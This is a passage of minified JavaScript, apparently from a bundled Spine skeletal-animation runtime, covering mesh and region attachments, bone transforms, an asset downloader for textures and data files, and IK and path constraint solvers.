this.index>=this.lines.length?null:this.lines[this.index++]}readEntry(t,e){if(!e)return 0;if(0==(e=e.trim()).length)return 0;let s=e.indexOf(":");if(-1==s)return 0;t[0]=e.substr(0,s).trim();for(let i=1,r=s+1;;i++){let s=e.indexOf(",",r);if(-1==s)return t[i]=e.substr(r).trim(),i;if(t[i]=e.substr(r,s-r).trim(),r=s+1,4==i)return 4}}}class ft{constructor(t){this.minFilter=e.Qb.Nearest,this.magFilter=e.Qb.Nearest,this.uWrap=e.Df.ClampToEdge,this.vWrap=e.Df.ClampToEdge,this.texture=null,this.width=0,this.height=0,this.pma=!1,this.name=t}setTexture(t){this.texture=t,t.setFilters(this.minFilter,this.magFilter),t.setWraps(this.uWrap,this.vWrap)}}class gt extends class{constructor(){this.u=0,this.v=0,this.u2=0,this.v2=0,this.width=0,this.height=0,this.degrees=0,this.offsetX=0,this.offsetY=0,this.originalWidth=0,this.originalHeight=0}}{constructor(t,e){super(),this.x=0,this.y=0,this.offsetX=0,this.offsetY=0,this.originalWidth=0,this.originalHeight=0,this.index=0,this.degrees=0,this.names=null,this.values=null,this.page=t,this.name=e}}class pt extends c{constructor(t,e){super(t),this.region=null,this.regionUVs=[],this.uvs=[],this.triangles=[],this.color=new r(1,1,1,1),this.width=0,this.height=0,this.hullLength=0,this.edges=[],this.parentMesh=null,this.sequence=null,this.tempColor=new r(0,0,0,0),this.path=e}updateRegion(){if(!this.region)throw new Error("Region not set.");let t=this.regionUVs;this.uvs&&this.uvs.length==t.length||(this.uvs=a.newFloatArray(t.length));let e=this.uvs,s=this.uvs.length,i=this.region.u,r=this.region.v,n=0,o=0;if(this.region instanceof gt){let a=this.region,l=a.page.texture.getImage(),h=l.width,c=l.height;switch(a.degrees){case 90:i-=(a.originalHeight-a.offsetY-a.height)/h,r-=(a.originalWidth-a.offsetX-a.width)/c,n=a.originalHeight/h,o=a.originalWidth/c;for(let a=0;a<s;a+=2)e[a]=i+t[a+1]*n,e[a+1]=r+(1-t[a])*o;return;case 180:i-=(a.originalWidth-a.offsetX-a.width)/h,r-=a.offsetY/c,n=a.originalWidth/h,o=a.originalHeight/c;for(let a=0;a<s;a+=2)e[a]=i+(1-t[a])*n,e[a+1]=r+(1-t[a+1])*o;return;case 270:i-=a.offsetY/h,r-=a.offsetX/c,n=a.originalHeight/h,o=a.originalWidth/c;for(let a=0;a<s;a+=2)e[a]=i+(1-t[a+1])*n,e[a+1]=r+t[a]*o;return}i-=a.offsetX/h,r-=(a.originalHeight-a.offsetY-a.height)/c,n=a.originalWidth/h,o=a.originalHeight/c}else this.region?(n=this.region.u2-i,o=this.region.v2-r):(i=r=0,n=o=1);for(let a=0;a<s;a+=2)e[a]=i+t[a]*n,e[a+1]=r+t[a+1]*o}getParentMesh(){return this.parentMesh}setParentMesh(t){this.parentMesh=t,t&&(this.bones=t.bones,this.vertices=t.vertices,this.worldVerticesLength=t.worldVerticesLength,this.regionUVs=t.regionUVs,this.triangles=t.triangles,this.hullLength=t.hullLength,this.worldVerticesLength=t.worldVerticesLength)}copy(){if(this.parentMesh)return this.newLinkedMesh();let t=new pt(this.name,this.path);return t.region=this.region,t.color.setFromColor(this.color),this.copyTo(t),t.regionUVs=new Array(this.regionUVs.length),a.arrayCopy(this.regionUVs,0,t.regionUVs,0,this.regionUVs.length),t.uvs=new Array(this.uvs.length),a.arrayCopy(this.uvs,0,t.uvs,0,this.uvs.length),t.triangles=new Array(this.triangles.length),a.arrayCopy(this.triangles,0,t.triangles,0,this.triangles.length),t.hullLength=this.hullLength,t.sequence=null!=this.sequence?this.sequence.copy():null,this.edges&&(t.edges=new Array(this.edges.length),a.arrayCopy(this.edges,0,t.edges,0,this.edges.length)),t.width=this.width,t.height=this.height,t}computeWorldVertices(t,e,s,i,r,n){null!=this.sequence&&this.sequence.apply(t,this),super.computeWorldVertices(t,e,s,i,r,n)}newLinkedMesh(){let t=new pt(this.name,this.path);return t.region=this.region,t.color.setFromColor(this.color),t.timelineAttahment=this.timelineAttahment,t.setParentMesh(this.parentMesh?this.parentMesh:this),null!=t.region&&t.updateRegion(),t}}class bt extends c{constructor(t){super(t),this.lengths=[],this.closed=!1,this.constantSpeed=!1,this.color=new r(1,1,1,1)}copy(){let t=new bt(this.name);return this.copyTo(t),t.lengths=new Array(this.lengths.length),a.arrayCopy(this.lengths,0,t.lengths,0,this.lengths.length),t.closed=closed,t.constantSpeed=this.constantSpeed,t.color.setFromColor(this.color),t}}class xt extends c{constructor(t){super(t),this.x=0,this.y=0,this.rotation=0,this.color=new r(.38,.94,0,1)}computeWorldPosition(t,e){return e.x=this.x*t.a+this.y*t.b+t.worldX,e.y=this.x*t.c+this.y*t.d+t.worldY,e}computeWorldRotation(t){let e=n.cosDeg(this.rotation),s=n.sinDeg(this.rotation),i=e*t.a+s*t.b,r=e*t.c+s*t.d;return Math.atan2(r,i)*n.radDeg}copy(){let t=new xt(this.name);return t.x=this.x,t.y=this.y,t.rotation=this.rotation,t.color.setFromColor(this.color),t}}class wt extends h{constructor(t,e){super(t),this.x=0,this.y=0,this.scaleX=1,this.scaleY=1,this.rotation=0,this.width=0,this.height=0,this.color=new r(1,1,1,1),this.rendererObject=null,this.region=null,this.sequence=null,this.offset=a.newFloatArray(8),this.uvs=a.newFloatArray(8),this.tempColor=new r(1,1,1,1),this.path=e}updateRegion(){if(!this.region)throw new Error("Region not set.");let t=this.region,e=this.width/this.region.originalWidth*this.scaleX,s=this.height/this.region.originalHeight*this.scaleY,i=-this.width/2*this.scaleX+this.region.offsetX*e,r=-this.height/2*this.scaleY+this.region.offsetY*s,n=i+this.region.width*e,a=r+this.region.height*s,o=this.rotation*Math.PI/180,l=Math.cos(o),h=Math.sin(o),c=this.x,d=this.y,u=i*l+c,m=i*h,f=r*l+d,g=r*h,p=n*l+c,b=n*h,x=a*l+d,w=a*h,y=this.offset;y[0]=u-g,y[1]=f+m,y[2]=u-w,y[3]=x+m,y[4]=p-w,y[5]=x+b,y[6]=p-g,y[7]=f+b;let v=this.uvs;90==t.degrees?(v[2]=t.u,v[3]=t.v2,v[4]=t.u,v[5]=t.v,v[6]=t.u2,v[7]=t.v,v[0]=t.u2,v[1]=t.v2):(v[0]=t.u,v[1]=t.v2,v[2]=t.u,v[3]=t.v,v[4]=t.u2,v[5]=t.v,v[6]=t.u2,v[7]=t.v2)}computeWorldVertices(t,e,s,i){null!=this.sequence&&this.sequence.apply(t,this);let r=t.bone,n=this.offset,a=r.worldX,o=r.worldY,l=r.a,h=r.b,c=r.c,d=r.d,u=0,m=0;u=n[0],m=n[1],e[s]=u*l+m*h+a,e[s+1]=u*c+m*d+o,s+=i,u=n[2],m=n[3],e[s]=u*l+m*h+a,e[s+1]=u*c+m*d+o,s+=i,u=n[4],m=n[5],e[s]=u*l+m*h+a,e[s+1]=u*c+m*d+o,s+=i,u=n[6],m=n[7],e[s]=u*l+m*h+a,e[s+1]=u*c+m*d+o}copy(){let t=new wt(this.name,this.path);return t.region=this.region,t.rendererObject=this.rendererObject,t.x=this.x,t.y=this.y,t.scaleX=this.scaleX,t.scaleY=this.scaleY,t.rotation=this.rotation,t.width=this.width,t.height=this.height,a.arrayCopy(this.uvs,0,t.uvs,0,8),a.arrayCopy(this.offset,0,t.offset,0,8),t.color.setFromColor(this.color),t.sequence=null!=this.sequence?this.sequence.copy():null,t}}wt.X1=0,wt.Y1=1,wt.C1R=2,wt.C1G=3,wt.C1B=4,wt.C1A=5,wt.U1=6,wt.V1=7,wt.X2=8,wt.Y2=9,wt.C2R=10,wt.C2G=11,wt.C2B=12,wt.C2A=13,wt.U2=14,wt.V2=15,wt.X3=16,wt.Y3=17,wt.C3R=18,wt.C3G=19,wt.C3B=20,wt.C3A=21,wt.U3=22,wt.V3=23,wt.X4=24,wt.Y4=25,wt.C4R=26,wt.C4G=27,wt.C4B=28,wt.C4A=29,wt.U4=30,wt.V4=31;class yt{constructor(t,s,i){if(this.index=0,this.parent=null,this.length=0,this.x=0,this.y=0,this.rotation=0,this.scaleX=1,this.scaleY=1,this.shearX=0,this.shearY=0,this.transformMode=e.Qe.Normal,this.skinRequired=!1,this.color=new r,t<0)throw new Error("index must be >= 0.");if(!s)throw new Error("name cannot be null.");this.index=t,this.name=s,this.parent=i}}e.Qe=void 0,(at=e.Qe||(e.Qe={}))[at.Normal=0]="Normal",at[at.OnlyTranslation=1]="OnlyTranslation",at[at.NoRotationOrReflection=2]="NoRotationOrReflection",at[at.NoScale=3]="NoScale",at[at.NoScaleOrReflection=4]="NoScaleOrReflection";class vt{constructor(t,e,s){if(this.parent=null,this.children=new Array,this.x=0,this.y=0,this.rotation=0,this.scaleX=0,this.scaleY=0,this.shearX=0,this.shearY=0,this.ax=0,this.ay=0,this.arotation=0,this.ascaleX=0,this.ascaleY=0,this.ashearX=0,this.ashearY=0,this.a=0,this.b=0,this.c=0,this.d=0,this.worldY=0,this.worldX=0,this.sorted=!1,this.active=!1,!t)throw new Error("data cannot be null.");if(!e)throw new Error("skeleton cannot be null.");this.data=t,this.skeleton=e,this.parent=s,this.setToSetupPose()}isActive(){return this.active}update(){this.updateWorldTransformWith(this.ax,this.ay,this.arotation,this.ascaleX,this.ascaleY,this.ashearX,this.ashearY)}updateWorldTransform(){this.updateWorldTransformWith(this.x,this.y,this.rotation,this.scaleX,this.scaleY,this.shearX,this.shearY)}updateWorldTransformWith(t,s,i,r,a,o,l){this.ax=t,this.ay=s,this.arotation=i,this.ascaleX=r,this.ascaleY=a,this.ashearX=o,this.ashearY=l;let h=this.parent;if(!h){let e=this.skeleton,h=i+90+l,c=e.scaleX,d=e.scaleY;return this.a=n.cosDeg(i+o)*r*c,this.b=n.cosDeg(h)*a*c,this.c=n.sinDeg(i+o)*r*d,this.d=n.sinDeg(h)*a*d,this.worldX=t*c+e.x,void(this.worldY=s*d+e.y)}let c=h.a,d=h.b,u=h.c,m=h.d;switch(this.worldX=c*t+d*s+h.worldX,this.worldY=u*t+m*s+h.worldY,this.data.transformMode){case e.Qe.Normal:{let t=i+90+l,e=n.cosDeg(i+o)*r,s=n.cosDeg(t)*a,h=n.sinDeg(i+o)*r,f=n.sinDeg(t)*a;return this.a=c*e+d*h,this.b=c*s+d*f,this.c=u*e+m*h,void(this.d=u*s+m*f)}case e.Qe.OnlyTranslation:{let t=i+90+l;this.a=n.cosDeg(i+o)*r,this.b=n.cosDeg(t)*a,this.c=n.sinDeg(i+o)*r,this.d=n.sinDeg(t)*a;break}case e.Qe.NoRotationOrReflection:{let t=c*c+u*u,e=0;t>1e-4?(t=Math.abs(c*m-d*u)/t,c/=this.skeleton.scaleX,u/=this.skeleton.scaleY,d=u*t,m=c*t,e=Math.atan2(u,c)*n.radDeg):(c=0,u=0,e=90-Math.atan2(m,d)*n.radDeg);let s=i+o-e,h=i+l-e+90,f=n.cosDeg(s)*r,g=n.cosDeg(h)*a,p=n.sinDeg(s)*r,b=n.sinDeg(h)*a;this.a=c*f-d*p,this.b=c*g-d*b,this.c=u*f+m*p,this.d=u*g+m*b;break}case e.Qe.NoScale:case e.Qe.NoScaleOrReflection:{let t=n.cosDeg(i),s=n.sinDeg(i),h=(c*t+d*s)/this.skeleton.scaleX,f=(u*t+m*s)/this.skeleton.scaleY,g=Math.sqrt(h*h+f*f);g>1e-5&&(g=1/g),h*=g,f*=g,g=Math.sqrt(h*h+f*f),this.data.transformMode==e.Qe.NoScale&&c*m-d*u<0!=(this.skeleton.scaleX<0!=this.skeleton.scaleY<0)&&(g=-g);let p=Math.PI/2+Math.atan2(f,h),b=Math.cos(p)*g,x=Math.sin(p)*g,w=n.cosDeg(o)*r,y=n.cosDeg(90+l)*a,v=n.sinDeg(o)*r,A=n.sinDeg(90+l)*a;this.a=h*w+b*v,this.b=h*y+b*A,this.c=f*w+x*v,this.d=f*y+x*A;break}}this.a*=this.skeleton.scaleX,this.b*=this.skeleton.scaleX,this.c*=this.skeleton.scaleY,this.d*=this.skeleton.scaleY}setToSetupPose(){let t=this.data;this.x=t.x,this.y=t.y,this.rotation=t.rotation,this.scaleX=t.scaleX,this.scaleY=t.scaleY,this.shearX=t.shearX,this.shearY=t.shearY}getWorldRotationX(){return Math.atan2(this.c,this.a)*n.radDeg}getWorldRotationY(){return Math.atan2(this.d,this.b)*n.radDeg}getWorldScaleX(){return Math.sqrt(this.a*this.a+this.c*this.c)}getWorldScaleY(){return Math.sqrt(this.b*this.b+this.d*this.d)}updateAppliedTransform(){let t=this.parent;if(!t)return this.ax=this.worldX-this.skeleton.x,this.ay=this.worldY-this.skeleton.y,this.arotation=Math.atan2(this.c,this.a)*n.radDeg,this.ascaleX=Math.sqrt(this.a*this.a+this.c*this.c),this.ascaleY=Math.sqrt(this.b*this.b+this.d*this.d),this.ashearX=0,void(this.ashearY=Math.atan2(this.a*this.b+this.c*this.d,this.a*this.d-this.b*this.c)*n.radDeg);let e=t.a,s=t.b,i=t.c,r=t.d,a=1/(e*r-s*i),o=this.worldX-t.worldX,l=this.worldY-t.worldY;this.ax=o*r*a-l*s*a,this.ay=l*e*a-o*i*a;let h=a*r,c=a*e,d=a*s,u=a*i,m=h*this.a-d*this.c,f=h*this.b-d*this.d,g=c*this.c-u*this.a,p=c*this.d-u*this.b;if(this.ashearX=0,this.ascaleX=Math.sqrt(m*m+g*g),this.ascaleX>1e-4){let t=m*p-f*g;this.ascaleY=t/this.ascaleX,this.ashearY=Math.atan2(m*f+g*p,t)*n.radDeg,this.arotation=Math.atan2(g,m)*n.radDeg}else this.ascaleX=0,this.ascaleY=Math.sqrt(f*f+p*p),this.ashearY=0,this.arotation=90-Math.atan2(p,f)*n.radDeg}worldToLocal(t){let e=1/(this.a*this.d-this.b*this.c),s=t.x-this.worldX,i=t.y-this.worldY;return t.x=s*this.d*e-i*this.b*e,t.y=i*this.a*e-s*this.c*e,t}localToWorld(t){let e=t.x,s=t.y;return t.x=e*this.a+s*this.b+this.worldX,t.y=e*this.c+s*this.d+this.worldY,t}worldToLocalRotation(t){let e=n.sinDeg(t),s=n.cosDeg(t);return Math.atan2(this.a*e-this.c*s,this.d*s-this.b*e)*n.radDeg+this.rotation-this.shearX}localToWorldRotation(t){t-=this.rotation-this.shearX;let e=n.sinDeg(t),s=n.cosDeg(t);return Math.atan2(s*this.c+e*this.d,s*this.a+e*this.b)*n.radDeg}rotateWorld(t){let e=this.a,s=this.b,i=this.c,r=this.d,a=n.cosDeg(t),o=n.sinDeg(t);this.a=a*e-o*i,this.b=a*s-o*r,this.c=o*e+a*i,this.d=o*s+a*r}}class At{constructor(t,e,s){this.name=t,this.order=e,this.skinRequired=s}}class Ct{constructor(){this.callbacks={},this.rawDataUris={}}dataUriToString(t){if(!t.startsWith("data:"))throw new Error("Not a data URI.");let e=t.indexOf("base64,");return-1!=e?(e+="base64,".length,atob(t.substr(e))):t.substr(t.indexOf(",")+1)}base64ToUint8Array(t){for(var e=window.atob(t),s=e.length,i=new Uint8Array(s),r=0;r<s;r++)i[r]=e.charCodeAt(r);return i}dataUriToUint8Array(t){if(!t.startsWith("data:"))throw new Error("Not a data URI.");let e=t.indexOf("base64,");if(-1==e)throw new Error("Not a binary data URI.");return e+="base64,".length,this.base64ToUint8Array(t.substr(e))}downloadText(t,e,s){if(this.start(t,e,s))return;if(this.rawDataUris[t]){try{let e=this.rawDataUris[t];this.finish(t,200,this.dataUriToString(e))}catch(e){this.finish(t,400,JSON.stringify(e))}return}let i=new XMLHttpRequest;i.overrideMimeType("text/html"),i.open("GET",t,!0);let r=()=>{this.finish(t,i.status,i.responseText)};i.onload=r,i.onerror=r,i.send()}downloadJson(t,e,s){this.downloadText(t,(t=>{e(JSON.parse(t))}),s)}downloadBinary(t,e,s){if(this.start(t,e,s))return;if(this.rawDataUris[t]){try{let e=this.rawDataUris[t];this.finish(t,200,this.dataUriToUint8Array(e))}catch(e){this.finish(t,400,JSON.stringify(e))}return}let i=new XMLHttpRequest;i.open("GET",t,!0),i.responseType="arraybuffer";let r=()=>{this.finish(t,i.status,i.response)};i.onload=()=>{200==i.status||0==i.status?this.finish(t,200,new Uint8Array(i.response)):r()},i.onerror=r,i.send()}start(t,e,s){let i=this.callbacks[t];try{if(i)return!0;this.callbacks[t]=i=[]}finally{i.push(e,s)}}finish(t,e,s){let i=this.callbacks[t];delete this.callbacks[t];let r=200==e||0==e?[s]:[e,s];for(let t=r.length-1,e=i.length;t<e;t+=2)i[t].apply(null,r)}}class St{constructor(t,e){if(this.intValue=0,this.floatValue=0,this.stringValue=null,this.time=0,this.volume=0,this.balance=0,!e)throw new Error("data cannot be null.");this.time=t,this.data=e}}class kt{constructor(t){this.intValue=0,this.floatValue=0,this.stringValue=null,this.audioPath=null,this.volume=0,this.balance=0,this.name=t}}class Et{constructor(t,e){if(this.bendDirection=0,this.compress=!1,this.stretch=!1,this.mix=1,this.softness=0,this.active=!1,!t)throw new Error("data cannot be null.");if(!e)throw new Error("skeleton cannot be null.");this.data=t,this.mix=t.mix,this.softness=t.softness,this.bendDirection=t.bendDirection,this.compress=t.compress,this.stretch=t.stretch,this.bones=new Array;for(let s=0;s<t.bones.length;s++){let i=e.findBone(t.bones[s].name);if(!i)throw new Error(`Couldn't find bone ${t.bones[s].name}`);this.bones.push(i)}let s=e.findBone(t.target.name);if(!s)throw new Error(`Couldn't find bone ${t.target.name}`);this.target=s}isActive(){return this.active}update(){if(0==this.mix)return;let t=this.target,e=this.bones;switch(e.length){case 1:this.apply1(e[0],t.worldX,t.worldY,this.compress,this.stretch,this.data.uniform,this.mix);break;case 2:this.apply2(e[0],e[1],t.worldX,t.worldY,this.bendDirection,this.stretch,this.data.uniform,this.softness,this.mix)}}apply1(t,s,i,r,a,o,l){let h=t.parent;if(!h)throw new Error("IK bone must have parent.");let c=h.a,d=h.b,u=h.c,m=h.d,f=-t.ashearX-t.arotation,g=0,p=0;switch(t.data.transformMode){case e.Qe.OnlyTranslation:g=s-t.worldX,p=i-t.worldY;break;case e.Qe.NoRotationOrReflection:let r=Math.abs(c*m-d*u)/(c*c+u*u),a=c/t.skeleton.scaleX,o=u/t.skeleton.scaleY;d=-o*r*t.skeleton.scaleX,m=a*r*t.skeleton.scaleY,f+=Math.atan2(o,a)*n.radDeg;default:let l=s-h.worldX,b=i-h.worldY,x=c*m-d*u;g=(l*m-b*d)/x-t.ax,p=(b*c-l*u)/x-t.ay}f+=Math.atan2(p,g)*n.radDeg,t.ascaleX<0&&(f+=180),f>180?f-=360:f<-180&&(f+=360);let b=t.ascaleX,x=t.ascaleY;if(r||a){switch(t.data.transformMode){case e.Qe.NoScale:case e.Qe.NoScaleOrReflection:g=s-t.worldX,p=i-t.worldY}let n=t.data.length*b,h=Math.sqrt(g*g+p*p);if(r&&h<n||a&&h>n&&n>1e-4){let t=(h/n-1)*l+1;b*=t,o&&(x*=t)}}t.updateWorldTransformWith(t.ax,t.ay,t.arotation+f*l,b,x,t.ashearX,t.ashearY)}apply2(t,e,s,i,r,a,o,l,h){let c=t.ax,d=t.ay,u=t.ascaleX,m=t.ascaleY,f=u,g=m,p=e.ascaleX,b=0,x=0,w=0;u<0?(u=-u,b=180,w=-1):(b=0,w=1),m<0&&(m=-m,w=-w),p<0?(p=-p,x=180):x=0;let y=e.ax,v=0,A=0,C=0,S=t.a,k=t.b,E=t.c,Y=t.d,M=Math.abs(u-m)<=1e-4;!M||a?(v=0,A=S*y+t.worldX,C=E*y+t.worldY):(v=e.ay,A=S*y+k*v+t.worldX,C=E*y+Y*v+t.worldY);let T=t.parent;if(!T)throw new Error("IK parent must itself have a parent.");S=T.a,k=T.b,E=T.c,Y=T.d;let I,X,R=1/(S*Y-k*E),L=A-T.worldX,P=C-T.worldY,q=(L*Y-P*k)*R-c,F=(P*S-L*E)*R-d,D=Math.sqrt(q*q+F*F),B=e.data.length*p;if(D<1e-4)return this.apply1(t,s,i,!1,a,!1,h),void e.updateWorldTransformWith(y,v,0,e.ascaleX,e.ascaleY,e.ashearX,e.ashearY);L=s-T.worldX,P=i-T.worldY;let V=(L*Y-P*k)*R-c,_=(P*S-L*E)*R-d,N=V*V+_*_;if(0!=l){l*=u*(p+1)*.5;let t=Math.sqrt(N),e=t-D-B*u+l;if(e>0){let s=Math.min(1,e/(2*l))-1;s=(e-l*(1-s*s))/t,V-=s*V,_-=s*_,N=V*V+_*_}}t:if(M){B*=u;let t=(N-D*D-B*B)/(2*D*B);t<-1?(t=-1,X=Math.PI*r):t>1?(t=1,X=0,a&&(S=(Math.sqrt(N)/(D+B)-1)*h+1,f*=S,o&&(g*=S))):X=Math.acos(t)*r,S=D+B*t,k=B*Math.sin(X),I=Math.atan2(_*S-V*k,V*S+_*k)}else{S=u*B,k=m*B;let t=S*S,e=k*k,s=Math.atan2(_,V);E=e*D*D+t*N-t*e;let i=-2*e*D,a=e-t;if(Y=i*i-4*a*E,Y>=0){let t=Math.sqrt(Y);i<0&&(t=-t),t=.5*-(i+t);let e=t/a,n=E/t,o=Math.abs(e)<Math.abs(n)?e:n;if(o*o<=N){P=Math.sqrt(N-o*o)*r,I=s-Math.atan2(P,o),X=Math.atan2(P/m,(o-D)/u);break t}}let o=n.PI,l=D-S,h=l*l,c=0,d=0,f=D+S,g=f*f,p=0;E=-S*D/(t-e),E>=-1&&E<=1&&(E=Math.acos(E),L=S*Math.cos(E)+D,P=k*Math.sin(E),Y=L*L+P*P,Y<h&&(o=E,h=Y,l=L,c=P),Y>g&&(d=E,g=Y,f=L,p=P)),N<=.5*(h+g)?(I=s-Math.atan2(c*r,l),X=o*r):(I=s-Math.atan2(p*r,f),X=d*r)}let O=Math.atan2(v,y)*w,W=t.arotation;I=(I-O)*n.radDeg+b-W,I>180?I-=360:I<-180&&(I+=360),t.updateWorldTransformWith(c,d,W+I*h,f,g,0,0),W=e.arotation,X=((X+O)*n.radDeg-e.ashearX)*w+x-W,X>180?X-=360:X<-180&&(X+=360),e.updateWorldTransformWith(y,v,W+X*h,e.ascaleX,e.ascaleY,e.ashearX,e.ashearY)}}class Yt extends At{constructor(t){super(t,0,!1),this.bones=new Array,this._target=null,this.bendDirection=1,this.compress=!1,this.stretch=!1,this.uniform=!1,this.mix=1,this.softness=0}set target(t){this._target=t}get target(){if(this._target)return this._target;throw new Error("BoneData not set.")}}class Mt extends At{constructor(t){super(t,0,!1),this.bones=new Array,this._target=null,this.positionMode=e.T.Fixed,this.spacingMode=e.m3.Fixed,this.rotateMode=e.YK.Chain,this.offsetRotation=0,this.position=0,this.spacing=0,this.mixRotate=0,this.mixX=0,this.mixY=0}set target(t){this._target=t}get target(){if(this._target)return this._target;throw new Error("SlotData not set.")}}e.T=void 0,(ot=e.T||(e.T={}))[ot.Fixed=0]="Fixed",ot[ot.Percent=1]="Percent",e.m3=void 0,(lt=e.m3||(e.m3={}))[lt.Length=0]="Length",lt[lt.Fixed=1]="Fixed",lt[lt.Percent=2]="Percent",lt[lt.Proportional=3]="Proportional",e.YK=void 0,(ht=e.YK||(e.YK={}))[ht.Tangent=0]="Tangent",ht[ht.Chain=1]="Chain",ht[ht.ChainScale=2]="ChainScale";class Tt{constructor(t,e){if(this.position=0,this.spacing=0,this.mixRotate=0,this.mixX=0,this.mixY=0,this.spaces=new Array,this.positions=new Array,this.world=new Array,this.curves=new Array,this.lengths=new Array,this.segments=new Array,this.active=!1,!t)throw new Error("data cannot be null.");if(!e)throw new Error("skeleton cannot be null.");this.data=t,this.bones=new Array;for(let s=0,i=t.bones.length;s<i;s++){let i=e.findBone(t.bones[s].name);if(!i)throw new Error(`Couldn't find bone ${t.bones[s].name}.`);this.bones.push(i)}let s=e.findSlot(t.target.name);if(!s)throw new Error(`Couldn't find target bone ${t.target.name}`);this.target=s,this.position=t.position,this.spacing=t.spacing,this.mixRotate=t.mixRotate,this.mixX=t.mixX,this.mixY=t.mixY}isActive(){return this.active}update(){let t=this.target.getAttachment();if(!(t instanceof bt))return;let s=this.mixRotate,i=this.mixX,r=this.mixY;if(0==s&&0==i&&0==r)return;let o=this.data,l=o.rotateMode==e.YK.Tangent,h=o.rotateMode==e.YK.ChainScale,c=this.bones,d=c.length,u=l?d:d+1,m=a.setArraySize(this.spaces,u),f=h?this.lengths=a.setArraySize(this.lengths,d):[],g=this.spacing;switch(o.spacingMode){case e.m3.Percent:if(h)for(let t=0,e=u-1;t<e;t++){let e=c[t],s=e.data.length;if(s<Tt.epsilon)f[t]=0;else{let i=s*e.a,r=s*e.c;f[t]=Math.sqrt(i*i+r*r)}}a.arrayFill(m,1,u,g);break;case e.m3.Proportional:let t=0;for(let e=0,s=u-1;e<s;){let s=c[e],i=s.data.length;if(i<Tt.epsilon)h&&(f[e]=0),m[++e]=g;else{let r=i*s.a,n=i*s.c,a=Math.sqrt(r*r+n*n);h&&(f[e]=a),m[++e]=a,t+=a}}if(t>0){t=u/t*g;for(let e=1;e<u;e++)m[e]*=t}break;default:let s=o.spacingMode==e.m3.Length;for(let t=0,e=u-1;t<e;){let e=c[t],i=e.data.length;if(i<Tt.epsilon)h&&(f[t]=0),m[++t]=g;else{let r=i*e.a,n=i*e.c,a=Math.sqrt(r*r+n*n);h&&(f[t]=a),m[++t]=(s?i+g:g)*a/i}}}let p=this.computeWorldPositions(t,u,l),b=p[0],x=p[1],w=o.offsetRotation,y=!1;if(0==w)y=o.rotateMode==e.YK.Chain;else{y=!1;let t=this.target.bone;w*=t.a*t.d-t.b*t.c>0?n.degRad:-n.degRad}for(let t=0,e=3;t<d;t++,e+=3){let a=c[t];a.worldX+=(b-a.worldX)*i,a.worldY+=(x-a.worldY)*r;let o=p[e],d=p[e+1],u=o-b,g=d-x;if(h){let e=f[t];if(0!=e){let t=(Math.sqrt(u*u+g*g)/e-1)*s+1;a.a*=t,a.c*=t}}if(b=o,x=d,s>0){let i=a.a,r=a.b,o=a.c,h=a.d,c=0,d=0,f=0;if(c=l?p[e-1]:0==m[t+1]?p[e+2]:Math.atan2(g,u),c-=Math.atan2(o,i),y){d=Math.cos(c),f=Math.sin(c);let t=a.data.length;b+=(t*(d*i-f*o)-u)*s,x+=(t*(f*i+d*o)-g)*s}else c+=w;c>n.PI?c-=n.PI2:c<-n.PI&&(c+=n.PI2),c*=s,d=Math.cos(c),f=Math.sin(c),a.a=d*i-f*o,a.b=d*r-f*h,a.c=f*i+d*o,a.d=f*r+d*h}a.updateAppliedTransform()}}computeWorldPositions(t,s,i){let r=this.target,n=this.position,o=this.spaces,l=a.setArraySize(this.positions,3*s+2),h=this.world,c=t.closed,d=t.worldVerticesLength,u=d/6,m=Tt.NONE;if(!t.constantSpeed){let f=t.lengths;u-=c?1:2;let g,p=f[u];switch(this.data.positionMode==e.T.Percent&&(n*=p),this.data.spacingMode){case e.m3.Percent:g=p;break;case e.m3.Proportional:g=p/s;break;default:g=1}h=a.setArraySize(this.world,8);for(let e=0,a=0,b=0;e<s;e++,a+=3){let s=o[e]*g;n+=s;let x=n;if(c)x%=p,x<0&&(x+=p),b=0;else{if(x<0){m!=Tt.BEFORE&&(m=Tt.BEFORE,t.computeWorldVertices(r,2,4,h,0,2)),this.addBeforePosition(x,h,0,l,a);continue}if(x>p){m!=Tt.AFTER&&(m=Tt.AFTER,t.computeWorldVertices(r,d-6,4,h,0,2)),this.addAfterPosition(x-p,h,0,l,a);continue}}for(;;b++){let t=f[b];if(!(x>t)){if(0==b)x/=t;else{let e=f[b-1];x=(x-e)/(t-e)}break}}b!=m&&(m=b,c&&b==u?(t.computeWorldVertices(r,d-4,4,h,0,2),t.computeWorldVertices(r,0,4,h,4,2)):t.computeWorldVertices(r,6*b+2,8,h,0,2)),this.addCurvePosition(x,h[0],h[1],h[2],h[3],h[4],h[5],h[6],h[7],l,a,i||e>0&&0==s)}return l}c?(d+=2,h=a.setArraySize(this.world,d),t.computeWorldVertices(r,2,d-4,h,0,2),t.computeWorldVertices(r,0,2,h,d-4,2),h[d-2]=h[0],h[d-1]=h[1]):(u--,d-=4,h=a.setArraySize(this.world,d),t.computeWorldVertices(r,2,d,h,0,2));let f,g=a.setArraySize(this.curves,u),p=0,b=h[0],x=h[1],w=0,y=0,v=0,A=0,C=0,S=0,k=0,E=0,Y=0,M=0,T=0,I=0,X=0,R=0;for(let t=0,e=2;t<u;t++,e+=6)w=h[e],y=h[e+1],v=h[e+2],A=h[e+3],C=h[e+4],S=h[e+5],k=.1875*(b-2*w+v),E=.1875*(x-2*y+A),Y=.09375*(3*(w-v)-b+C),M=.09375*(3*(y-A)-x+S),T=2*k+Y,I=2*E+M,X=.75*(w-b)+k+.16666667*Y,R=.75*(y-x)+E+.16666667*M,p+=Math.sqrt(X*X+R*R),X+=T,R+=I,T+=Y,I+=M,p+=Math.sqrt(X*X+R*R),X+=T,R+=I,p+=Math.sqrt(X*X+R*R),X+=T+Y,R+=I+M,p+=Math.sqrt(X*X+R*R),g[t]=p,b=C,x=S;switch(this.data.positionMode==e.T.Percent&&(n*=p),this.data.spacingMode){case e.m3.Percent:f=p;break;case e.m3.Proportional:f=p/s;break;default:f=1}let L=this.segments,P=0;for(let t=0,e=0,r=0,a=0;t<s;t++,e+=3){let s=o[t]*f;n+=s;let u=n;if(c)u%=p,u<0&&(u+=p),r=0;else{if(u<0){this.addBeforePosition(u,h,0,l,e);continue}if(u>p){this.addAfterPosition(u-p,h,d-4,l,e);continue}}for(;;r++){let t=g[r];if(!(u>t)){if(0==r)u/=t;else{let e=g[r-1];u=(u-e)/(t-e)}break}}if(r!=m){m=r;let 